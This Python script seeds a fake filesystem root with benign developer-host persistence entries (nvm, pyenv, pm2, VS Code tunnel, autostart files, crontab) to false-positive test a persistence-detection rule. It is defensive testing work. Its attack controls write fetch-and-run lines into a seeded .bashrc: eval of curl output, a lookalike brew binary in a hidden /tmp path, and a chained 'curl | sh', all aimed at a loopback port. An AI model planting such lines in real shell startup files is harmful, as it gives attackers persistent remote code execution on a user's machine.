#!/usr/bin/env python3
"""plants_devhost.py seed|remove|list [ROOT] -- false-positive test of Custom.Linux.Persistence.Sweep
on a DEVELOPER host profile. Inert text files in a fake root; nothing is executed, no network target.

Benign decoys (must NOT be flagged). Source of each line: [doc] = copied from the tool's own docs/template
(fetched 2026-11-26), [typ] = typical form written by the author (unverified exact wording).
  B01 ~/.bashrc   nvm loader                                   [doc nvm README]
  B02 ~/.bashrc   pyenv: export PYENV_ROOT + eval "$(pyenv init - bash)"   [doc pyenv README]
  B03 ~/.bashrc   Homebrew on Linux eval "$(.../brew shellenv)"            [doc Homebrew-on-Linux.md]
  B04 ~/.bashrc   eval "$(ssh-agent -s)"                       [typ]
  B05 ~/.bashrc   eval "$(direnv hook bash)" / zoxide / starship  [typ]
  B06 ~/.zshrc    powerlevel10k: [[ ! -f ~/.p10k.zsh ]] || source ~/.p10k.zsh  [typ]
  B07 etc/systemd/system/pm2-dev.service  pm2 startup template, node from ~/.nvm/versions/node/v20.11.1  [doc pm2 systemd.tpl]
  B08 ~/.config/systemd/user/code-tunnel.service  VS Code CLI tunnel unit, exe ~/.vscode-server/code-<commit>  [doc vscode service_linux.rs]
  B09 ~/.config/systemd/user/docker.service  rootless dockerd ExecStart=~/bin/dockerd-rootless.sh  [typ]
  B10 ~/.config/autostart/org.signal.Signal.desktop  flatpak run ...  [typ]
  B11 ~/.config/autostart/slack_slack.desktop  Exec=/snap/bin/slack  [typ]
  B12 ~/.config/autostart/jetbrains-toolbox.desktop  ~/.local/share/JetBrains/Toolbox/bin/jetbrains-toolbox --minimize  [typ]
  B13 user crontab  */15 * * * * ~/.nvm/versions/node/v20.11.1/bin/node ~/proj/sync.js  [typ]
Known noise (flagged BY DESIGN, counted separately): N1 @reboot tmux, N2 @reboot jupyter lab.
Attack controls (MUST be flagged): A1 eval "$(curl -s http://127.0.0.1:9/x)", A2 eval "$(/tmp/.x1y2z3q/brew shellenv)",
  A3 eval "$(pyenv init -)"; curl ... (second command chained after the allowed idiom).
"""
import os, shutil, sys
ROOT = sys.argv[2]  # required: a scratch directory used as a fake filesystem root
H = "home/dev"
NODE = "/home/dev/.nvm/versions/node/v20.11.1"
COMMIT = "f1a4fb101478ce6ec82fe9627c43efbf9e98c813"

def w(p, t, mode=0o644):
    p = f"{ROOT}/{p}"; os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, "a") as f: f.write(t)
    os.chmod(p, mode)

def seed():
    remove(quiet=True)
    w(f"{H}/.bashrc",
      "# ~/.bashrc (developer)\n"
      'export NVM_DIR="$HOME/.nvm"\n'
      '[ -s "$NVM_DIR/nvm.sh" ] && \\. "$NVM_DIR/nvm.sh" # This loads nvm\n'          # B01
      'export PYENV_ROOT="$HOME/.pyenv"\n'
      'eval "$(pyenv init - bash)"\n'                                                  # B02
      'eval "$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)"\n'                       # B03
      'eval "$(ssh-agent -s)" >/dev/null\n'                                            # B04
      'eval "$(direnv hook bash)"\n'                                                   # B05
      'eval "$(zoxide init bash)"\n'
      'eval "$(starship init bash)"\n'
      # attack controls
      'eval "$(curl -s http://127.0.0.1:9/x)"\n'                                      # A1
      'eval "$(/tmp/.x1y2z3q/brew shellenv)"\n'                                        # A2
      'eval "$(pyenv init -)"; curl -s http://127.0.0.1:9/y | sh\n')                   # A3
    w(f"{H}/.zshrc", "[[ ! -f ~/.p10k.zsh ]] || source ~/.p10k.zsh\n")                 # B06
    w("etc/systemd/system/pm2-dev.service",                                           # B07
      "[Unit]\nDescription=PM2 process manager\nDocumentation=https://pm2.keymetrics.io/\nAfter=network.target\n\n"
      "[Service]\nType=forking\nUser=dev\nLimitNOFILE=infinity\n"
      f"Environment=PATH={NODE}/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin\n"
      "Environment=PM2_HOME=/home/dev/.pm2\nPIDFile=/home/dev/.pm2/pm2.pid\nRestart=on-failure\n\n"
      f"ExecStart={NODE}/lib/node_modules/pm2/bin/pm2 resurrect\n"
      f"ExecReload={NODE}/lib/node_modules/pm2/bin/pm2 reload all\n"
      f"ExecStop={NODE}/lib/node_modules/pm2/bin/pm2 kill\n\n[Install]\nWantedBy=multi-user.target\n")
    w(f"{H}/.config/systemd/user/code-tunnel.service",                                 # B08
      "[Unit]\nDescription=Visual Studio Code Tunnel\nAfter=network.target\nStartLimitIntervalSec=0\n\n"
      "[Service]\nType=simple\nRestart=always\nRestartSec=10\n"
      f'ExecStart=/home/dev/.vscode-server/code-{COMMIT} "--verbose" "--cli-data-dir" "/home/dev/.vscode/cli" "tunnel" "service" "internal-run"\n'
      "\n[Install]\nWantedBy=default.target\n")
    w(f"{H}/.config/systemd/user/docker.service",                                      # B09
      "[Unit]\nDescription=Docker Application Container Engine (Rootless)\n[Service]\n"
      "Environment=PATH=/home/dev/bin:/sbin:/usr/sbin:/home/dev/.local/bin:/usr/bin\n"
      "ExecStart=/home/dev/bin/dockerd-rootless.sh\nExecReload=/bin/kill -s HUP $MAINPID\n"
      "[Install]\nWantedBy=default.target\n")
    w(f"{H}/.config/autostart/org.signal.Signal.desktop",                              # B10
      "[Desktop Entry]\nType=Application\nName=Signal\n"
      "Exec=/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=signal-desktop org.signal.Signal --start-in-tray\n")
    w(f"{H}/.config/autostart/slack_slack.desktop",                                    # B11
      "[Desktop Entry]\nType=Application\nName=Slack\nExec=env BAMF_DESKTOP_FILE_HINT=/var/lib/snapd/desktop/applications/slack_slack.desktop /snap/bin/slack -u %U\n")
    w(f"{H}/.config/autostart/jetbrains-toolbox.desktop",                              # B12
      "[Desktop Entry]\nType=Application\nName=JetBrains Toolbox\n"
      "Exec=/home/dev/.local/share/JetBrains/Toolbox/bin/jetbrains-toolbox --minimize\n")
    w("var/spool/cron/crontabs/dev",
      f"*/15 * * * * {NODE}/bin/node /home/dev/proj/sync.js\n"                          # B13
      "@reboot /usr/bin/tmux new-session -d -s main\n"                                   # N1
      "@reboot /home/dev/.local/bin/jupyter lab --no-browser\n", 0o600)                  # N2
    print("seeded 13 benign dev-host decoys + 2 noise + 3 attack controls under", ROOT)

def remove(quiet=False):
    if os.path.isdir(ROOT):
        for r, ds, fs in os.walk(ROOT):
            for x in ds + fs: os.chmod(os.path.join(r, x), 0o755)
        shutil.rmtree(ROOT)
    if not quiet: print("removed", ROOT, "exists_now=", os.path.exists(ROOT))

cmd = sys.argv[1] if len(sys.argv) > 1 else "list"
if cmd == "seed": seed()
elif cmd == "remove": remove()
else:
    for r, _, fs in os.walk(ROOT):
        for f in fs: print(os.path.join(r, f))
